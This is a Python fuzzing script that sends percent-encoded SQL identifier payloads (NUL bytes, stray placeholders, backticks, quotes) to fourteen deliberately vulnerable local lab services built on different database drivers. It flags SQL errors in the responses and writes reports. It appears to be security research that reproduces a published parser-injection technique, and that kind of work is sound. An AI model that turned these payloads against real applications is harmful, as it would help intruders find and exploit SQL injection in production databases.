#!/usr/bin/env python3
import argparse
import json
import re
import sys
import urllib.request
from pathlib import Path


# Container-internal ports (used from attacker container)
INTERNAL_SERVICES = [
    ("php-pdo-emulate", "8080", "/vuln", "mysql"),
    ("php-pdo-native", "8080", "/vuln", "mysql"),
    ("node-mysql2", "3000", "/vuln", "mysql"),
    ("node-knex", "3000", "/vuln", "mysql"),
    ("node-sequelize", "3000", "/vuln", "mysql"),
    ("python-mysql-connector", "5000", "/vuln", "mysql"),
    ("python-sqlalchemy", "5000", "/vuln", "mysql"),
    ("java-jdbc", "8080", "/vuln", "mysql"),
    ("java-spring-boot", "8080", "/vuln", "mysql"),
    ("ruby-activerecord", "4567", "/vuln", "mysql"),
    ("ruby-pg", "4567", "/vuln", "postgres"),
    ("go-mysql-native", "8080", "/vuln", "mysql"),
    ("go-mysql-emulate", "8080", "/vuln", "mysql"),
    ("php-laravel-qb", "8080", "/vuln", "mysql"),
]

# Host-exposed ports (used from host machine)
HOST_SERVICES = [
    ("php-pdo-emulate", "8081", "/vuln", "mysql"),
    ("php-pdo-native", "8082", "/vuln", "mysql"),
    ("node-mysql2", "3001", "/vuln", "mysql"),
    ("node-knex", "3002", "/vuln", "mysql"),
    ("node-sequelize", "3003", "/vuln", "mysql"),
    ("python-mysql-connector", "5001", "/vuln", "mysql"),
    ("python-sqlalchemy", "5002", "/vuln", "mysql"),
    ("java-jdbc", "8083", "/vuln", "mysql"),
    ("java-spring-boot", "8084", "/vuln", "mysql"),
    ("ruby-activerecord", "4568", "/vuln", "mysql"),
    ("ruby-pg", "4569", "/vuln", "postgres"),
    ("go-mysql-native", "8091", "/vuln", "mysql"),
    ("go-mysql-emulate", "8092", "/vuln", "mysql"),
    ("php-laravel-qb", "8085", "/vuln", "mysql"),
]


def http_get(url: str):
    try:
        with urllib.request.urlopen(url, timeout=15) as resp:
            code = resp.getcode()
            body = resp.read().decode(errors="replace")
            return code, body
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode(errors="replace")
        except Exception:
            body = ""
        return e.code, body
    except Exception as e:
        return 0, str(e)


def payloads_for(dialect: str):
    # Percent-encoded identifier payloads inspired by the Assetnote write-up
    base = [
        ("benign", "name"),
        ("nul", "%00"),
        ("qmark_nul", "%3F%00"),           # ?\0
        ("qmark_hash_nul", "%3F%23%00"),    # ?#\0
        ("double_q", "%3F%3F"),             # ??
        ("q_semihash_nul", "%3F%3B%23%00"), # ?;#\0
    ]
    if dialect == "mysql":
        # Backtick-related and named placeholder variants
        base += [
            ("name_bt", "name%60"),           # trailing backtick
            ("name_q", "name%3F"),           # name?
            ("named_colon", "%3Aname"),      # :name (named)
        ]
    else:
        # Postgres uses $1; include quotes-related
        base += [
            ("dq_in_id", "%22%3F%22"),       # "?"
            ("name_dq_q", "name%22%3F%22"),  # name"?"
        ]
    # Suffix each onto a column-like token as well
    out = []
    for tag, enc in base:
        out.append((f"raw_{tag}", enc))
        out.append((f"sfx_{tag}", f"name{enc}"))
    return out


ERROR_PATTERNS = [
    re.compile(r"HY093|Invalid parameter number", re.I),
    re.compile(r"wrong number of bind variables", re.I),
    re.compile(r"number of bound variables", re.I),
    re.compile(r"syntax error|ER_PARSE_ERROR|You have an error in your SQL syntax", re.I),
    re.compile(r"unknown column|no such column", re.I),
]


def has_indicator(http_code: int, body: str, benign: bool):
    if not benign and http_code >= 400:
        return True
    if not benign:
        for rx in ERROR_PATTERNS:
            if rx.search(body or ""):
                return True
    return False


def run(base_dir: str, out_dir: Path, services):
    out_dir.mkdir(parents=True, exist_ok=True)
    ndjson = out_dir / "assetnote-fuzz.ndjson"
    jpath = out_dir / "assetnote-fuzz.json"
    mpath = out_dir / "assetnote-fuzz.md"
    results = []

    with ndjson.open("w", encoding="utf-8") as nd:
        for svc, port, ep, dialect in services:
            base = f"{svc}:{port}"
            for tag, enc in payloads_for(dialect):
                benign = tag.endswith("benign")
                qs = f"col={enc}&name=apple"
                url = f"http://{base}{ep}?{qs}"
                code, body = http_get(url)
                indicator = has_indicator(code, body, benign)
                rec = {
                    "service": svc,
                    "dialect": dialect,
                    "endpoint": ep,
                    "tag": tag,
                    "encoded_col": enc,
                    "http_code": code,
                    "indicator": bool(indicator),
                    "body": body,
                }
                nd.write(json.dumps(rec, ensure_ascii=False) + "\n")
                results.append(rec)

    with jpath.open("w", encoding="utf-8") as jf:
        json.dump(results, jf, ensure_ascii=False, indent=2)

    # Markdown summary per service
    with mpath.open("w", encoding="utf-8") as md:
        md.write("# Assetnote-style parser fuzz results\n\n")
        for svc in sorted({r["service"] for r in results}):
            svc_res = [r for r in results if r["service"] == svc]
            total = len(svc_res)
            hits = sum(1 for r in svc_res if r["indicator"])  # errors or heuristic match
            md.write(f"## {svc} — indicators: {hits}/{total}\n")
            # List top 5 tags that triggered
            tags = [r["tag"] for r in svc_res if r["indicator"]]
            top = sorted(set(tags))[:10]
            for t in top:
                md.write(f"- {t}\n")
            md.write("\n")

    print(f"Wrote: {ndjson}, {jpath}, {mpath}")


def main():
    parser = argparse.ArgumentParser(description="Fuzz all services with Assetnote-style identifier payloads")
    parser.add_argument("--out-dir", default="/workspace/out", help="output directory")
    parser.add_argument("--ports", choices=["internal", "host"], default="internal", help="use container-internal or host-exposed ports")
    args = parser.parse_args()
    services = INTERNAL_SERVICES if args.ports == "internal" else HOST_SERVICES
    run("/workspace", Path(args.out_dir), services)


if __name__ == "__main__":
    main()


